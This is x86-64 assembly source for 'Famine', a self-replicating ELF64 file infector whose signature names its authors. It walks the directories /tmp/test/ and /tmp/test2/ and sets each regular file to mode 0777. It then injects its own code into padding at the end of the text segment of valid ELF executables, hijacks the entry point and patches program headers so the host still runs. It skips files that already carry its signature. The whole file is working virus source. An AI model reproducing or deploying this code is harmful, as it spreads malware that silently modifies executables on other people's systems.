; famine elf64 - size 723 bytes

%include "famine.inc"

bits			64
default			rel
global			_start
section			.text

_host:
	; empty program
				mov			rax, __NR_exit
				syscall

_start:
				push		rdi
				push		rsi
				push		rcx
				push		rdx

	; set up famine struc on stack
				push		rbp
				mov			rbp, rsp
				sub			rbp, famine_size

				lea			rax, [rel _start]
				mov			rdx, [rel virus_entry]
				sub			rax, rdx
				add			rax, [rel host_entry]
				push		rax
				lea			rdi, [rel infect_dir]
	.opendir:
				mov			r14, rdi
				mov			rsi, O_RDONLY | O_DIRECTORY
				mov			rax, __NR_open
				syscall
				test		eax, eax
				jl			.nextdir				
				mov			VARS(famine.dir_fd), rax
	.readdir:
				mov			rdx, DIRENT_ARR_SIZE
				lea			rsi, VARS(famine.dirents)
				mov			rdi, VARS(famine.dir_fd)
				mov			rax, __NR_getdents
				syscall
				test		rax, rax
				jle			.closedir
				xor			r13, r13
				mov			r12, rax
	.file:
	; look for next regular file and process it
				lea			rdi, VARS(famine.dirents)
				add			rdi, r13											; offset in dirent array
				movzx		edx, word [rdi + dirent.d_reclen]
				mov			al, byte [rdi + rdx - 1]							; file type
				add			rdi, dirent.d_name
				add			r13, rdx
				cmp			al, DT_REG
				jne			.nextfile
				call		process
	.nextfile:
				cmp			r13, r12
				jl			.file
				jmp			.readdir
	.closedir:
				mov			rdi, VARS(famine.dir_fd)
				mov			rax, __NR_close
				syscall
	.nextdir:
				xor			ecx, ecx
				mul			ecx
				dec			ecx
				mov			rdi, r14
				repnz		scasb
				cmp			byte [rdi], 0
				jnz			.opendir

				pop			rax
				pop			rbp
				pop			rdx
				pop			rcx
				pop			rsi
				pop			rdi
				jmp			rax

process:
	; r14 = infection dir name, rdi = file name
				mov			rsi, r14
				mov			rax, rdi
				lea			rdi, VARS(famine.file_path)
				mov			rdx, rdi
	; concat directory and filename
	.dirname:
				movsb
				cmp			byte [rsi], 0
				jnz			.dirname
				mov			rsi, rax
	.filename:
				movsb
				cmp			byte [rsi - 1], 0
				jnz			.filename
	; change permissions of file
				mov			rdi, rdx
				push		rdi
				mov			rsi, 0o777
				mov			rax, __NR_chmod
				syscall
				pop			rdi
	; open file
				mov			rsi, O_RDWR
				mov			rax, __NR_open
				syscall
				test		eax, eax
				jl			.return
				mov			VARS(famine.file_fd), rax
	; check for minimal file size
				lea			rsi, VARS(famine.stat)
				mov			rdi, rax
				mov			rax, __NR_fstat
				syscall
				cmp			rax, 0
				jnz			.close
				mov			rsi, qword VARS(famine.stat + stat.st_size)
				mov			VARS(famine.file_size), rsi
				cmp			rsi, elf64_ehdr_size + elf64_phdr_size + VIRUS_SIZE
				jl			.close
	; mmap file
				xor			r9, r9
				mov			r8, VARS(famine.file_fd)
				mov			r10, MAP_SHARED
				mov			rdx, PROT_READ | PROT_WRITE
				xor			rdi, rdi
				mov			rax, __NR_mmap
				syscall
				cmp			rax, MMAP_ERRORS
				jae			.close
				mov			VARS(famine.file_data), rax
				mov			rdi, rax

				call		is_valid_elf64
				test		al, al
				jz			.unmap
				call		inject_virus
	.unmap:
				mov			rsi, VARS(famine.file_size)
				mov			rdi, VARS(famine.file_data)
				mov			rax, __NR_munmap
				syscall
	.close:
				mov			rdi, VARS(famine.file_fd)
				mov			rax, __NR_close
				syscall
	.return:
				ret

is_valid_elf64:
	; rdi = beginning of file data
				xor			rax, rax
				cmp			qword [rdi + 8], rax
				jnz			.return
				mov			rdx, ELF_SYSV
				cmp			qword [rdi], rdx
				jz			.continue
				mov			rdx, ELF_GNU
				cmp			qword [rdi], rdx
				jnz			.return
	.continue:
				mov			rdx, ELF64_ET_DYN
				cmp			qword [rdi + 16], rdx
				jz			.ok
				mov			rdx, ELF64_ET_EXEC
				cmp			qword [rdi + 16], rdx
				jnz			.return
	.ok:
				inc			rax
	.return:
				ret

inject_virus:
	; rdi = beginning of file data
				push		r13
				push		r14
				push		r15

				mov			r15, rdi
				mov			rdx, qword [rdi + elf64_ehdr.e_entry]
				movzx		rcx, word [rdi + elf64_ehdr.e_phnum]
				mov			rax, qword [rdi + elf64_ehdr.e_phoff]
				add			rdi, rax											; code segment Elf64_Phdr
				mov			r14, rdi
	.segment:
				cmp			rcx, 0
				jle			.return
				mov			rax, SEGMENT_TYPE
				cmp			rax, qword [rdi]
				jnz			.next
				mov			rax, qword [rdi + elf64_phdr.p_vaddr]
				cmp			rdx, rax
				jb			.next
				add			rax, qword [rdi + elf64_phdr.p_memsz]
				mov			r13, rax											; new entry point
				cmp			rdx, rax
				jl			.find_space
	.next:
				add			rdi, elf64_phdr_size
				dec			rcx
				jmp			.segment
	.find_space:
	; abort if not enough empty bytes in text segment to write virus
				mov			rax, qword [rdi + elf64_phdr.p_offset]
				add			rax, qword [rdi + elf64_phdr.p_filesz]
				lea			rdi, [r15 + rax]									; data + p_offset + p_filesz
				mov			rsi, rdi											; end of segment
				xor			al, al
				mov			rcx, VIRUS_SIZE
				repz		scasb
				test		rcx, rcx
				ja			.return
	; abort if binary is already infected
				lea			rdi, [rel _start]
				xchg		rdi, rsi
				mov			rax, [rel signature]
				cmp			rax, qword [rdi - (_finish - signature)]
				jz			.return
	; copy virus
				mov			rcx, VIRUS_SIZE
				repnz		movsb
	; save entrypoints
				mov			rax, qword [r15 + elf64_ehdr.e_entry]
				mov			qword [rdi - 16], r13								; save virus_entry
				mov			qword [rdi - 8], rax								; save host_entry
	; update binary headers
				mov			qword [r15 + elf64_ehdr.e_entry], r13				; set new entrypoint to virus
				mov			rax, VIRUS_SIZE
				add			qword [r14 + elf64_phdr.p_filesz], rax				; increase p_filesz
				add			qword [r14 + elf64_phdr.p_memsz], rax				; increase p_memsz
	.return:
				pop			r15
				pop			r14
				pop			r13
				ret

	; persistent data
infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
signature		db			"Famine version 1.0 (c)oded by asarandi-sgardner",0
virus_entry		dq			_start
host_entry		dq			_host
_finish:
